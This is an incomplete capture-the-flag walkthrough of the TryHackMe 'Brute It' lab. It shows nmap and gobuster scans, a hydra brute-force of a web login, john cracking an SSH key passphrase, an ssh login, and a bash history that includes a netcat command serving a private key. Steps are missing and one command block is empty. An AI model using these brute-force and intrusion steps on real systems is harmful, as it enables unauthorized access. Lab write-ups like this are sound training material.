#   Tryhackme - Brute It

##  Walkthrough by
```
Shaswata Saha
16-07-23
01:20PM
```

## export IP=10.10.11.197 

##  Steps
1.  Nmap scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-16 14:28 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:28
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE: Active NSE Script Threads: 1 (0 waiting)
NSE Timing: About 0.00% done
Completed NSE at 14:28, 0.00s elapsed
Initiating NSE at 14:28
Completed NSE at 14:28, 0.00s elapsed
Initiating NSE at 14:28
Completed NSE at 14:28, 0.00s elapsed
Initiating Ping Scan at 14:28
Scanning 10.10.117.228 [2 ports]
Completed Ping Scan at 14:28, 0.37s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:28
Completed Parallel DNS resolution of 1 host. at 14:28, 0.19s elapsed
Initiating Connect Scan at 14:28
Scanning 10.10.117.228 [1000 ports]
Discovered open port 22/tcp on 10.10.117.228
Discovered open port 80/tcp on 10.10.117.228
Increasing send delay for 10.10.117.228 from 0 to 5 due to 54 out of 179 dropped probes since last increase.
Completed Connect Scan at 14:29, 33.40s elapsed (1000 total ports)
Initiating Service scan at 14:29
Scanning 2 services on 10.10.117.228
Completed Service scan at 14:29, 6.89s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.117.228.
Initiating NSE at 14:29
Completed NSE at 14:29, 11.04s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 1.33s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Nmap scan report for 10.10.117.228
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.02 seconds

```

2.  Gobuster scan:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.117.228 -w Documents/gobuster-wordlist/dsstorewordlist.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.228
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/16 14:28:55 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.117.228/admin/]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
Progress: 1828 / 1829 (99.95%)
===============================================================
2023/07/16 14:29:57 Finished
===============================================================


```

3.  We gate  a hint from the /admin folder --> source:
```
<!-- Hey john, if you do not remember, the username is admin -->
```

4.  Lets get the post request and use hydra:
```bash
hydra -l admin -P Documents/rockyou.txt 10.10.117.228 http-post-form "/admin:user=admin&pass=^PASS^:InvUsername or password invalid"

```

6.  Make a new file with 6 letter pass:
```bash
awk 'length($0) == 6' Documents/rockyou.txt > Desktop/tryhackme/Brute_It 
```

7.  Crack the encrypted hash using john:
```

```

8.  Crack the decrypted file to get the password:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ john Desktop/tryhackme/Brute_It/id_rsa.john -wordlist=Documents/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2023-07-16 15:28) 11.11g/s 806933p/s 806933c/s 806933C/s romeo23..renatito
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

9.  We try to login using ssh:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Brute_It]
└─$ chmod 600 id_rsa
                                                                                             
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Brute_It]
└─$ ls -al
total 13380
drwxr-xr-x  2 subhro1530 subhro1530     4096 Jul 16 15:26 .
drwxr-xr-x 33 subhro1530 subhro1530     4096 Jul 16 04:06 ..
-rw-r--r--  1 subhro1530 subhro1530     2210 Jul 16 14:59 hydra_result.txt
-rw-------  1 subhro1530 subhro1530     1765 Jul 16 15:03 id_rsa
-rwxrwxrwx  1 subhro1530 subhro1530     2458 Jul 16 15:27 id_rsa.john
-rw-r--r--  1 subhro1530 subhro1530     2525 Jul 16 14:29 nmap.nmap
-rw-r--r--  1 subhro1530 subhro1530     5187 Jul 16 15:29 README.md
-rw-r--r--  1 subhro1530 subhro1530 13653794 Jul 16 14:45 rockyou_6_dig.txt
-rw-r--r--  1 subhro1530 subhro1530     9677 Jul 16 15:25 ssh2john.py
                                                                                             
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Brute_It]
└─$ ssh -i id_rsa john@10.10.117.228
Enter passphrase for key 'id_rsa': rockinroll

```

10. We got some hints from the bash history
```bash
john@bruteit:~$ cat .bash_history 
ls
cat user.txt 
cat idrsa
ls
cat idrssa.pu
cat idrsa.pub 
ls .ssh
rm idrsa
rm idrsa.pub 
clear
sudo -l
su root
exit
sl
l
ls
ssh-keygen -t rsa
ls
ssh-keygen -t rsa
ls
cd ..
ls
cat idrsa
ls
python -m SimpleHTTPServer
ifconfig
python -m SimpleHTTPServer
nc -lvp 4444 < idrsa
ls
apt search ssh
apt search openssh-server
clear
find / -user root -perm /4000 2>/dev/null
clear
sudo -l
visudo
su root
john@bruteit:~$ 
```